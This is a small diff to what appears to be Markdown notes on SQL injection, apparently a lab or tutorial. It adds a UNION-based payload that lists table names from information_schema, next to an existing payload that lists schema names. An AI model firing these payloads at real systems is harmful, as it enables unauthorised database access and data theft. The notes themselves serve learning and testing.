@@ -342,6 +342,9 @@ select * from `Users` where user = 'admin' and password = md5('meow')
 `'  union select 'a','a', schema_name FROM information_schema.schemata ;`
 ![](https://i.imgur.com/fUGtidb.png)
 
+---
+
+`'  union select 'a','a', table_name FROM information_schema.tables;`
 
 ---
 
